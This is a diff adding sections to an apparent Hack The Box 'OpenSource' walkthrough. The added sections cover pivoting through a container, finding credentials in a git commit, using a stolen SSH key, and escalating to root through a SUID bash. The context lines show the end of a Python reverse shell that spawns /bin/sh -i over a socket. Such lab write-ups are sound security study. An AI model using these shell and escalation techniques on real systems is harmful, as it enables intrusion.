@@ -65,3 +65,27 @@ dup2(s.fileno(),1)
 dup2(s.fileno(),2) 
 run(["/bin/sh","-i"])
 ~~~
+
+Once inside the container realize that the port `3000` is not filtered. so we need **pivoting** and tunnel through the container to see the app running on `3000`
+
+
+### Pivoting
+
+used this [repo inside the container](https://github.com/BloodhoundAllfather/dembe)
+now the webserver is available on my own lap top.
+
+in `users` we see that a user named `dev01` exists.
+tried bruteforcing  it with no luck. 
+
+### User Credentials
+
+Started digging in the source code and found [this](https://github.com/mohsenkamini/htb-opensource/commit/a76f8f75f7a4a12b706b0cf9c983796fa1985820)
+
+using the creds to login inside the gitea and found an `id_rsa` which enables login to `dev01@opensource.htb`
+
+
+# Root Access
+
+Running `linpeas` show `/bin/bash` has `sbit`/`SUID` enabled. running `/bin/bash -p` provides root access.
+
+
